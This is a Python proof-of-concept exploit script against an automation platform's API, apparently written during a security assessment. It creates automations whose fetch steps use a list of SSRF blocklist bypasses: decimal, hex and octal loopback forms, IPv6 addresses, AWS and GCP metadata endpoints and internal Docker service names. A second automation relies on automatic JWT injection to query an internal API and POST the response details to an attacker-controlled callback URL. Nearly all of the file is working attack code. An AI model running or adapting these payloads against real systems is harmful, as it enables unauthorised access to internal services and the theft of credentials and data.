#!/usr/bin/env python3
"""
PoC #9 — SSRF with Automatic JWT Injection
HIGH: Fetch instruction auto-injects bearer token for internal URLs.
Blocklist only has 127.0.0.1 and localhost — trivially bypassed.

Usage: python3 poc_09_ssrf_jwt_injection.py --target https://dev.example.com --workspace-id WS_ID --token AUTH_TOKEN --callback https://your-server.com/capture
"""

import argparse
import requests
import json
import urllib3
urllib3.disable_warnings()


# SSRF bypass payloads for the blocklist
SSRF_BYPASSES = {
    "decimal_ip": "http://2130706433/",              # 127.0.0.1 as decimal
    "hex_ip": "http://0x7f000001/",                  # 127.0.0.1 as hex
    "octal_ip": "http://0177.0.0.1/",                # 127.0.0.1 as octal
    "ipv6_loopback": "http://[::1]/",                # IPv6 loopback
    "ipv6_mapped": "http://[::ffff:127.0.0.1]/",     # IPv6-mapped IPv4
    "zero_ip": "http://0.0.0.0/",                    # 0.0.0.0
    "short_zero": "http://0/",                        # Shorthand 0
    "cloud_metadata_aws": "http://169.254.169.254/latest/meta-data/",
    "cloud_metadata_gcp": "http://metadata.google.internal/computeMetadata/v1/",
    "internal_3004": "http://events:3004/",           # Docker internal service name
    "internal_3002": "http://workspaces:3002/",       # Docker internal service name
    "internal_3003": "http://runtime:3003/",          # Docker internal service name
}


def create_ssrf_automation(base_url, workspace_id, token, fetch_url, slug_suffix=""):
    """Create an automation with a fetch instruction targeting the SSRF URL."""

    url = f"{base_url}/v2/workspaces/{workspace_id}/automations"
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json",
    }

    slug = f"poc-ssrf-{slug_suffix}" if slug_suffix else "poc-ssrf-test"

    automation = {
        "slug": slug,
        "name": f"PoC SSRF {slug_suffix}",
        "trigger": {"events": [f"poc.ssrf.{slug_suffix or 'test'}"]},
        "instructions": [
            {
                "fetch": {
                    "url": fetch_url,
                    "method": "GET",
                    "headers": {},
                },
                "output": "ssrf_result"
            },
            {
                "emit": {
                    "event": "poc.ssrf.result",
                    "payload": {
                        "target": fetch_url,
                        "status": "{{ssrf_result.status}}",
                        "body": "{{ssrf_result.body}}",
                        "headers": "{{ssrf_result.headers}}",
                    }
                }
            }
        ]
    }

    try:
        r = requests.post(url, headers=headers, json=automation, verify=False, timeout=15)
        if r.status_code in (200, 201):
            return slug
        else:
            return None
    except:
        return None


def test_ssrf_bypasses(base_url, workspace_id, token):
    """Test various SSRF bypass techniques."""
    print("\n[*] Testing SSRF blocklist bypasses...")

    results = {}
    for name, payload_url in SSRF_BYPASSES.items():
        print(f"\n  [*] Testing {name}: {payload_url}")
        slug = create_ssrf_automation(base_url, workspace_id, token, payload_url, name.replace("_", "-"))
        if slug:
            print(f"    [INFO] Automation created: {slug}")
            results[name] = True
        else:
            print(f"    [INFO] Failed to create automation")
            results[name] = False

    return results


def test_jwt_exfiltration(base_url, workspace_id, token, callback_url):
    """Create automation that fetches internal URL — the JWT gets auto-injected.
    Then fetches callback URL with the JWT in the body."""
    print(f"\n[*] Testing JWT auto-injection + exfiltration to {callback_url}...")

    url = f"{base_url}/v2/workspaces/{workspace_id}/automations"
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json",
    }

    # This automation:
    # 1. Fetches an internal Prisme URL (JWT auto-injected by runtime)
    # 2. Sends the response (containing auth context) to attacker callback
    automation = {
        "slug": "poc-ssrf-jwt-exfil",
        "name": "PoC SSRF JWT Exfiltration",
        "trigger": {"events": ["poc.ssrf.jwt"]},
        "instructions": [
            # Step 1: Fetch internal API with auto-injected JWT
            {
                "fetch": {
                    "url": f"{base_url}/v2/workspaces",
                    "method": "GET",
                },
                "output": "internal_response"
            },
            # Step 2: Send results to callback
            {
                "fetch": {
                    "url": callback_url,
                    "method": "POST",
                    "body": {
                        "jwt_injected": True,
                        "internal_status": "{{internal_response.status}}",
                        "internal_headers": "{{internal_response.headers}}",
                        "workspaces_count": "{{internal_response.body.length}}",
                    },
                },
                "output": "exfil_response"
            },
            {
                "emit": {
                    "event": "poc.ssrf.jwt.result",
                    "payload": {
                        "internal_status": "{{internal_response.status}}",
                        "exfil_status": "{{exfil_response.status}}",
                    }
                }
            }
        ]
    }

    try:
        r = requests.post(url, headers=headers, json=automation, verify=False, timeout=15)
        print(f"  Status: {r.status_code}")
        if r.status_code in (200, 201):
            print(f"  [HIGH] JWT exfiltration automation created!")
            print(f"  [INFO] Trigger event 'poc.ssrf.jwt' and check your callback server")
            return True
        else:
            print(f"  Response: {r.text[:500]}")
    except Exception as e:
        print(f"  [ERROR] {e}")
    return False


def main():
    parser = argparse.ArgumentParser(description="PoC #9: SSRF with JWT Auto-Injection")
    parser.add_argument("--target", required=True, help="Base URL")
    parser.add_argument("--workspace-id", required=True, help="Workspace ID")
    parser.add_argument("--token", default="", help="Bearer token (optional with auto-auth)")
    parser.add_argument("--callback", default=None, help="Callback URL to receive exfiltrated data")
    args = parser.parse_args()

    if not args.token:
        from auth_helper import get_anonymous_token
        print("[*] No token provided — obtaining anonymous auth token...")
        token, user_id, _ = get_anonymous_token(args.target)
        if token:
            args.token = token
            print(f"[+] Anonymous token obtained! User ID: {user_id}")
        else:
            print("[-] Failed to get anonymous token. Provide --token manually.")
            return


    base = args.target.rstrip("/")
    print(f"[*] Target: {base}")
    print("=" * 60)

    bypass_results = test_ssrf_bypasses(base, args.workspace_id, args.token)

    jwt_result = False
    if args.callback:
        jwt_result = test_jwt_exfiltration(base, args.workspace_id, args.token, args.callback)

    print("\n" + "=" * 60)
    print("[*] SSRF BYPASS SUMMARY")
    for k, v in bypass_results.items():
        print(f"  {k}: {'AUTOMATION CREATED' if v else 'FAILED'}")
    if args.callback:
        print(f"  jwt_exfiltration: {'CREATED' if jwt_result else 'FAILED'}")
    print("\n[*] Trigger the events and check poc.ssrf.result / callback for responses")


if __name__ == "__main__":
    main()
